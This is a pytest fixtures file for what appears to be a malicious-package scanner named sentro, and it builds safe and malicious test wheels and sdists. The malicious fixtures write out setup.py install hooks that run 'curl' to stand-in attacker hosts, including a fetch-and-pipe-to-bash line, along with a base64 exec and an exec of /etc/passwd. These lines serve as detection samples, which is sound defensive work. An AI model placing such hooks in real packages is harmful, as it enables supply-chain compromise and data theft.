"""Shared pytest fixtures."""

from __future__ import annotations

import io
import tarfile
import zipfile
from pathlib import Path

import pytest

from sentro.config import load_config
from sentro.models import PackageFiles


# ---------------------------------------------------------------------------
# In-memory wheel / sdist builders
# ---------------------------------------------------------------------------

def _make_wheel(dest: Path, name: str, version: str, files: dict[str, str]) -> Path:
    """Create a minimal .whl file with the given Python source files."""
    dest.mkdir(parents=True, exist_ok=True)
    whl_path = dest / f"{name}-{version}-py3-none-any.whl"
    with zipfile.ZipFile(whl_path, "w") as zf:
        for rel_path, content in files.items():
            zf.writestr(rel_path, content)
    return whl_path


def _make_sdist(dest: Path, name: str, version: str, files: dict[str, str]) -> Path:
    dest.mkdir(parents=True, exist_ok=True)
    sdist_path = dest / f"{name}-{version}.tar.gz"
    with tarfile.open(sdist_path, "w:gz") as tf:
        for rel_path, content in files.items():
            data = content.encode("utf-8")
            info = tarfile.TarInfo(name=f"{name}-{version}/{rel_path}")
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return sdist_path


@pytest.fixture(scope="session")
def tmp_wheels(tmp_path_factory) -> Path:
    return tmp_path_factory.mktemp("wheels")


@pytest.fixture(scope="session")
def safe_wheel(tmp_wheels) -> Path:
    return _make_wheel(
        tmp_wheels,
        name="safe_pkg",
        version="1.0.0",
        files={
            "safe_pkg/__init__.py": "# safe package\ndef hello():\n    return 'hello'\n",
            "safe_pkg/utils.py": "def add(a, b):\n    return a + b\n",
        },
    )


@pytest.fixture(scope="session")
def malicious_wheel(tmp_wheels) -> Path:
    return _make_wheel(
        tmp_wheels,
        name="evil_pkg",
        version="0.1.0",
        files={
            "evil_pkg/__init__.py": (
                "import base64\n"
                "exec(base64.b64decode('aW1wb3J0IG9z'))\n"
            ),
            "evil_pkg/setup.py": (
                "import os\n"
                "os.system('curl http://evil.com/exfil')\n"
                "from setuptools import setup\nsetup(name='evil_pkg')\n"
            ),
        },
    )


@pytest.fixture(scope="session")
def safe_sdist(tmp_wheels) -> Path:
    return _make_sdist(
        tmp_wheels,
        name="safe_sdist",
        version="1.0.0",
        files={
            "safe_sdist/__init__.py": "# safe\n",
            "setup.py": "from setuptools import setup\nsetup(name='safe_sdist', version='1.0.0')\n",
        },
    )


# ---------------------------------------------------------------------------
# Config fixture
# ---------------------------------------------------------------------------

@pytest.fixture
def default_config():
    return load_config()


# ---------------------------------------------------------------------------
# PackageFiles fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def safe_package_files(tmp_path) -> PackageFiles:
    src = tmp_path / "safe_pkg"
    src.mkdir()
    (src / "__init__.py").write_text("def hello():\n    return 'hi'\n")
    return PackageFiles(
        name="safe_pkg",
        version="1.0.0",
        source_dir=tmp_path,
        python_files=[src / "__init__.py"],
        setup_py=None,
        pyproject_toml=None,
        pypi_metadata={"info": {"author": "test", "home_page": "https://example.com", "summary": "safe"}, "releases": {"1.0.0": [{}]}},
        download_stats={"last_month": 50000},
    )


@pytest.fixture
def package_with_eval(tmp_path) -> PackageFiles:
    src = tmp_path / "evil"
    src.mkdir()
    evil_file = src / "__init__.py"
    evil_file.write_text("import os\nexec(open('/etc/passwd').read())\n")
    return PackageFiles(
        name="evil",
        version="0.1.0",
        source_dir=tmp_path,
        python_files=[evil_file],
    )


@pytest.fixture
def package_with_setup_hooks(tmp_path) -> PackageFiles:
    setup_py = tmp_path / "setup.py"
    setup_py.write_text(
        "import os\n"
        "os.system('curl http://attacker.com/payload | bash')\n"
        "from setuptools import setup\nsetup(name='bad')\n"
    )
    return PackageFiles(
        name="bad",
        version="0.1.0",
        source_dir=tmp_path,
        python_files=[],
        setup_py=setup_py,
    )
